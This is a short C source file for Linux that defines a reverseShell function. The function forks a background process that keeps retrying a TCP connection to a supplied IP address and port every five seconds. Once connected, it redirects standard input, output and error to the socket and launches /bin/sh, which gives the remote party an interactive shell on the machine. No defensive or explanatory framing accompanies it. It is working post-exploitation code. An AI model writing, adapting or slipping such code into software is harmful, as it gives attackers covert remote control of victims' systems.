#include "header.h"

#ifdef __LINUX__
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int reverseShell(const char *clientIp, int clientPort)
{
    pid_t pid = fork();  // pid>0, parent process; pid=0, client process
    if (pid == -1) 
    {
        write(2, "[ERROR] fork failed.\n", 21);
        return (1);
    }
    if (pid > 0)  // this is parent process
    {
        return (0);
    }

    // this is client process
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(clientPort);
    sa.sin_addr.s_addr = inet_addr(clientIp);
    int sockt = socket(AF_INET, SOCK_STREAM, 0);

#if 1  // WAIT_FOR_CLIENT
    while (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0) 
    {
        sleep(5);
    }
#else 
    if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0)
    {
        write(2, "[ERROR] connect failed.\n", 24);
        return (1);
    }
#endif

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
    return 0;
}
#endif 